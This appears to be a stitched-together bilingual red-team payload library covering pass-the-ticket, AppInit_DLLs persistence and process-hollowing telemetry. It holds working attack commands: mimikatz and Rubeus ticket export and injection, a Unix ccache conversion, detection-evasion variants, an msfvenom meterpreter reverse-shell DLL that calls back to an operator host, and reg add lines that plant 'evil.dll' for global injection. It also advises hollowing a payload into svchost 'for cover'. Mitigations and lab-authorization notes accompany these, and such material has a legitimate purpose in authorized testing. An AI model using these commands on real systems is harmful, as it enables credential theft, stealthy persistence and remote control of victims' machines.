description.en: Evades NTLM relay detection and NTLM event alerts by exchanging the hash for a Kerberos TGT first so traffic looks like standard Kerberos. Success: dir lists the share with Kerberos traffic only.

description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_PASS_THE_HASH_E_1 with blue-team logs; hash-based authentication opening a target shell with event 4624 NewCredentials confirms success.

description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_PASS_THE_HASH_E_2 with blue-team logs; crackmapexec returning a positive authentication against the target (Pwn3d! meaning local admin) confirms success.

name.zh: Pass-the-Ticket 票据传递

description.zh: 导入窃取的 TGT/TGS 票据访问目标服务，验证票据与主体绑定的检测能力。
description.en: Imports stolen .kirbi TGT/TGS tickets on another machine and accesses the target service, verifying that ticket-to-host binding detection and PAC validation actually catch reuse within ticket lifetime.

overview.zh: Kerberos 票据导入防护审计覆盖票据传递场景：针对已从内存导出 .kirbi 票据的测试主体，验证票据能否导入其他会话或主机并直接以原身份访问服务。验证维度涵盖内存票据导出、mimikatz ptt 注入与 Rubeus base64 注入三条路径。
overview.en: Kerberos Ticket-Import Protection Audit covers pass-the-ticket: for a test principal holding .kirbi tickets exported from memory, verify whether the tickets import into other sessions or hosts and access services as the original identity. Verification dimensions cover in-memory ticket export, mimikatz ptt injection, and Rubeus base64 injection.

vulnerability.zh: 根因是 Kerberos 票据在有效期内与来源主体、来源主机解耦，.kirbi 文件可在任意机器导入使用；服务端不做 PAC 来源校验、终端未启用凭据守护时，被导出的票据等同于身份本身，可在票据剩余寿命内自由复用。
vulnerability.en: The root cause is that Kerberos tickets are decoupled from the originating principal and host for their validity period, and .kirbi files import on any machine; without server-side PAC origin validation or endpoint credential guard, an exported ticket equals the identity itself and is freely reusable for its remaining lifetime.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 sekurlsa::tickets /export 从目标内存导出票据，当前目录生成多个 .kirbi 文件即确认成功；第 2 步用 kerberos::ptt 把目标服务票据导入当前会话，klist 显示该票据且可访问对应资源即确认接管；第 3 步用 Rubeus ptt /ticket:<base64> 在另一台主机复现跨机导入。票据在过期前均可重复利用；LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 exports tickets from target memory with sekurlsa::tickets /export — multiple .kirbi files appearing locally confirm success; step 2 imports the target service ticket with kerberos::ptt — klist showing the ticket plus access to the corresponding resource confirms takeover; step 3 replays cross-machine import on another host with Rubeus ptt /ticket:<base64>. Tickets remain reusable until expiry; replace LAB_* placeholders via the global variables menu.

mitigation.zh:
敏感服务账号启用 Kerberos 凭据守护与 PAC 签名校验，缩短服务票据生命周期，限制调试权限阻断内存导出，监控同一票据多主机使用：
    reg add HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f
    reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags /t REG_DWORD /d 1 /f
    reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters /v PacSignatureValidationSupported /t REG_DWORD /d 1 /f
    修复后用第 2 步样例回归，导入的票据应被服务以 PAC 校验失败拒绝。
mitigation.en: Enable Kerberos credential guard and PAC signature validation for sensitive service accounts, shorten service-ticket lifetimes, and restrict debug privileges to block memory export; monitor the same ticket used across multiple hosts. After the fix, regress with the step 2 sample: imported tickets must fail PAC validation at the service.

description.zh: 在已控主机运行 sekurlsa::tickets /export；生成一批 .kirbi 文件即可跨机复用，优先挑高权限账号的票据。
description.en: Run sekurlsa::tickets /export on the controlled host; the exported .kirbi files are reusable across machines, privileged accounts first.

title.zh: 注入票据冒充他人身份

description.zh: 将选中的 ticket.kirbi 用 kerberos::ptt 注入当前会话；klist 显示他人票据即身份冒充完成，可直接访问其授权资源。
description.en: Inject the chosen ticket.kirbi with kerberos::ptt; the foreign ticket shown by klist completes impersonation and opens its authorized resources.

title.zh: 跨机复用票据收割资源

description.zh: 把票据 Base64 后用 Rubeus ptt 注入跳板机；无需口令即访问该账号可用的 SMB、数据库等资源，完成票据横向。
description.en: Base64 the ticket and inject on the pivot with Rubeus ptt; the account's SMB and database resources open without its password, completing ticket-based lateral movement.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 Kerberos 票据导入防护审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Kerberos Ticket-Import Protection Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: Kerberos 票据导入防护审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Kerberos Ticket-Import Protection Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 导入票据只指向实验服务；.kirbi 文件用后立即删除并在目标侧执行 klist purge。
opsecTips.en: Import tickets only for lab services, delete .kirbi files right after use, and run klist purge on the target.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: base64 无文件注入规避变体

description.zh: 绕过票据落盘检测（.kirbi 文件扫描）：base64 直传内存注入。成功判据：klist 出现票据且磁盘无 .kirbi 文件。
description.en: Evades on-disk ticket detection (.kirbi scanning) by injecting base64 directly into memory. Success: klist shows the ticket with no .kirbi file on disk.

title.zh: Unix ccache 注入规避变体

wafBypass.command: ticket_converter.py {LAB_TGT_KIRBI} /tmp/cc_{LAB_USER} && export KRB5CCNAME=/tmp/cc_{LAB_USER} && klist && kvno cifs/{LAB_HOST}

description.zh: 绕过 Windows 侧 ptt 工具特征：在 Unix 侧以 ccache 完成同等票据注入使用。成功判据：kvno 返回服务票据。
description.en: Evades Windows-side ptt tooling signatures by achieving the same ticket usage via ccache on the Unix side. Success: kvno returns a service ticket.

title.zh: 多票据循环注入规避变体

wafBypass.command: for t in {LAB_TGT_KIRBI} {LAB_SVC_KIRBI}; do Rubeus.exe ptt /ticket:$t; done; klist

description.zh: 绕过单票据注入的时间窗检测：批量循环导入降低单位时间事件密度关联。成功判据：klist 列出全部注入票据。
description.en: Evades time-window detection on single-ticket injection by importing in a batch loop to dilute per-time event correlation. Success: klist lists all injected tickets.

description.zh: 从内存导出 Kerberos 票据；成功时当前目录生成多个 .kirbi 文件。
description.en: Export Kerberos tickets from memory; multiple .kirbi files created in the working directory confirm success.

description.zh: 注入票据到当前会话；成功时 klist 显示注入的服务票据并可访问对应资源。
description.en: Inject the ticket into the current session; klist showing the injected service ticket with access to the corresponding resource confirms success.

description.zh: 用 Rubeus 注入 base64 票据；成功时输出票据已注入且 klist 可见。
description.en: Inject the base64 ticket with Rubeus; the tool reporting injection with the ticket visible in klist confirms success.

name.zh: AppInit 与模块注入持久化审计

description.zh: 审计 AppInit_DLLs 与进程注入类持久化配置，验证模块加载痕迹。
description.en: Sets AppInit_DLLs to a crafted library and verifies that User32-loading processes load it globally, forming a file-less-triggered persistence governed by only a few registry values.

overview.zh: 该 Payload 覆盖 AppInit 与模块注入持久化审计场景，检验全局 DLL 注入机制的配置条件与加载行为。验证维度含载荷生成、AppInit 配置读取与注册表写入三步，对应第 1 至第 3 步。
overview.en: This payload covers AppInit and module-injection persistence auditing, testing configuration conditions and load behavior of global DLL injection. Validation covers payload generation, AppInit configuration reading and registry writing, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 AppInit_DLLs 机制对加载 User32 的进程全局生效且仅受少数注册表值约束：开启状态下写入路径即让大量进程加载指定 DLL，形成无文件触发的持久化。
vulnerability.en: The root cause is AppInit_DLLs applying globally to every process loading User32, constrained by only a few registry values: once enabled, a written path makes many processes load the DLL, creating file-trigger-free persistence.

exploitation.zh: 第 1 步用 msfvenom 生成 64 位反向 DLL 作为测试载荷；第 2 步读取 AppInit_DLLs 与 LoadAppInit_DLLs 当前值评估注入条件；第 3 步以 reg add 写入测试 DLL 路径并回读，加载 User32 的进程拉起该 DLL 回连即确认全局注入生效。以监听会话建立为判据。占位符在全局变量菜单替换；测试后恢复注册表值。
exploitation.en: In step 1, generate a 64-bit reverse DLL with msfvenom as the test payload. In step 2, read current AppInit_DLLs and LoadAppInit_DLLs to assess injection conditions. In step 3, write the test DLL path with reg add and read it back; User32-loading processes pulling the DLL and calling back confirm global injection, judged by an established listener session. Replace placeholders via the global variables menu; restore registry values after testing.

mitigation.zh:
保持 LoadAppInit_DLLs=0 并强制签名，基线监控键值变更，对可疑 DLL 加载告警：
    $k = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'
    Set-ItemProperty $k AppInit_DLLs ''
    Set-ItemProperty $k LoadAppInit_DLLs 0
    Set-ItemProperty $k RequireSignedAppInit_DLLs 1
mitigation.en: Keep LoadAppInit_DLLs at 0 with signing required, baseline-monitor changes to the key, and alert on suspicious DLL load events. After the fix, replay step 3: the write should alert and no process loads the test DLL.

description.zh: 用 msfvenom 生成 64 位反向连接 DLL；本地开启监听等待注入成功后的回连信号，作为全局注入的载荷来源。
description.en: Generate the 64-bit reverse DLL with msfvenom; the local listener waits for the callback once injection lands.

attackChain.payload: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LAB_OPERATOR_HOST} LPORT=4444 -f dll > evil.dll

title.zh: 读取 AppInit 配置条件

description.zh: 查询 AppInit_DLLs、LoadAppInit_DLLs 与 RequireSignedAppInit_DLLs 三个键值；Load 为 1 且未强制签名即满足全局注入前提。
description.en: Query AppInit_DLLs, LoadAppInit_DLLs and RequireSignedAppInit_DLLs; Load set to 1 with signing not enforced clears the way for global injection.

title.zh: 写入 AppInit 全局注入

description.zh: 把 AppInit_DLLs 指向第 1 步生成的 evil.dll；此后启动的用户态进程加载该 DLL 并回连，即完成全局模块注入式持久化。
description.en: Point AppInit_DLLs at the step-1 evil.dll; every user-mode process that starts loads it and calls back, achieving global injection persistence.

attackChain.payload: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\evil.dll" /f & reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 AppInit 与模块注入持久化审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for AppInit and Module-Injection Persistence Audit are authorized in writing and reversible.

An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: AppInit_DLLs 影响全部 User32 进程——只在隔离镜像开启并验证单进程加载，验证后立即清空注册表值避免系统级连锁。
opsecTips.en: AppInit_DLLs affects every User32 process — enable it only on an isolated image, verify loading in a single process, and clear the registry value immediately to avoid system-wide side effects.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 规避独立后门进程特征：借合法系统进程加载 DLL；导出函数执行副作用出现即成功。
description.en: Load the DLL via the legitimate system process to avoid a standalone backdoor process; side effects of the exported function confirm success.

description.zh: 把恶意 DLL 以应用依赖名放入签名目录借宿主加载；宿主进程加载 version.dll 即成功。
description.en: Place the DLL under an application dependency name in a signed directory; the host loading version.dll confirms success.

description.zh: 内存反射加载避免 LoadLibrary 与注册表痕迹；目标进程模块列表无 DLL 但功能生效即成功。
description.en: Reflectively load in memory to avoid LoadLibrary and registry footprints; functionality working without the DLL listed in the process modules confirms success.

execution.command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LAB_OPERATOR_HOST} LPORT=4444 -f dll > evil.dll

description.zh: 用 msfvenom 生成 64 位反向连接 DLL，作为模块注入持久化验证的测试载荷。
description.en: Uses msfvenom to build a 64-bit reverse-shell DLL as the test payload for module-injection persistence validation.

title.zh: 读取 AppInit_DLLs 注册表配置

description.zh: 查询 AppInit_DLLs、LoadAppInit_DLLs 与 RequireSignedAppInit_DLLs 的当前值，评估全局 DLL 注入持久化条件。
description.en: Queries the current AppInit_DLLs, LoadAppInit_DLLs, and RequireSignedAppInit_DLLs values to assess global DLL-injection persistence conditions.

execution.command: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\evil.dll" /f & reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f

description.zh: 写入 AppInit_DLLs 指向测试 DLL；回读值生效且加载 AppInit 的进程加载该 DLL，即确认全局注入条件。
description.en: Point AppInit_DLLs at the test DLL; the value persisting and AppInit-loading processes loading it confirm global injection conditions.

name.zh: 进程镂空 Sysmon 检测遥测

description.zh: 对比进程映像与内存执行体不一致的镂空特征，验证内存注入遥测。
description.en: Launches a hollowed process whose image path and name look legitimate while its module list and parent differ, then cross-checks which telemetry sources such as image-load and memory-access events actually surface the mismatch.

overview.zh: 该 Payload 覆盖进程镂空的遥测与内存审计场景，检验 SVCHOST 类宿主进程的路径与模块完整性核查方法。验证维度含 Sysmon 事件审计、SVCHOST 实例核查与可疑关联复核三步，对应第 1 至第 3 步。
overview.en: This payload covers process-hollowing telemetry and memory auditing, testing path and module integrity checks on SVCHOST-class host processes. Validation covers Sysmon event review, SVCHOST instance verification and suspicious-correlation follow-up, mapped to steps 1 through 3.

vulnerability.zh: 根因在于镂空技术以合法镜像为宿主替换执行内容：进程名与路径看似正常而模块列表与父进程异常，遥测若未覆盖镜像加载与内存访问事件即形成盲区。
vulnerability.en: The root cause is hollowing using a legitimate image as the host while swapping execution content: process name and path look normal yet module lists and parentage go wrong, and telemetry without image-load and memory-access events leaves blind spots.

exploitation.zh: 第 1 步抽取 Sysmon 的进程创建、镜像加载与进程访问三类事件，核对 SVCHOST 实例的父进程与命令行是否符合基线；第 2 步枚举运行中 SVCHOST 的路径与模块列表，路径为空或模块异常即定位可疑宿主；第 3 步对命中实例回查创建与加载事件形成时间线并以同一请求标识关联。以异常实例定位为成功判据。占位符在全局变量菜单替换。
exploitation.en: In step 1, pull Sysmon process-creation, image-load and process-access events, checking SVCHOST instances' parent processes and command lines against baselines. In step 2, enumerate running SVCHOST paths and module lists; empty paths or odd module sets mark suspicious hosts. In step 3, trace hits back to creation and load events for a timeline, correlating under one request ID. Judge success by locating anomalous instances. Replace placeholders via the global variables menu.

mitigation.zh:
Sysmon 全量启用并集中收集 1/7/10 事件，对路径空值与非常规父进程建立实时检测规则：
    sysmon64 -accepteula -i C:\sysmon\config.xml
    <EventFiltering>
      <ProcessCreate onmatch="exclude"/>
      <ImageLoad onmatch="exclude"/>
      <ProcessAccess onmatch="exclude"/>
    </EventFiltering>
mitigation.en: Run Sysmon at full coverage collecting events 1, 7 and 10 centrally, with real-time rules for empty paths and atypical parents. After the fix, replay steps 1 through 3: a drilled hollowing sample should be caught at step 1.

title.zh: 筛查 Sysmon 进程事件

description.zh: 抽取 Sysmon 的进程创建、镜像加载与进程访问事件，核对 SVCHOST 的父进程、命令行和模块；出现非常规父进程即锁定可疑宿主。
description.en: Pull Sysmon process-creation, image-load and access events and vet SVCHOST parents, command lines and modules; odd parentage flags a suspect host.

title.zh: 核查 SVCHOST 实例完整性

description.zh: 枚举运行中 SVCHOST 的可执行路径与已加载模块；路径为空或模块列表异常的实例即疑似被镂空替换的宿主，记录编号待用。
description.en: Enumerate running SVCHOST paths and loaded modules; an empty path or anomalous module list marks a likely hollowed host and its PID.

attackChain.payload: Get-Process svchost -ErrorAction SilentlyContinue | Select-Object Id, ProcessName, Path, @{n='ModuleSample';e={(@($_.Modules | Select-Object -First 5).ModuleName) -join ','}}

title.en: Trace the event chain to pin the host

description.zh: 对可疑实例回查其创建与镜像加载事件并按时间串联；确认宿主后即可把载荷镂空进合法 svchost，借系统进程掩护长期运行。
description.en: Correlate the suspect's creation and image-load events on a timeline; once pinned, hollow your payload into the legitimate svchost for cover.
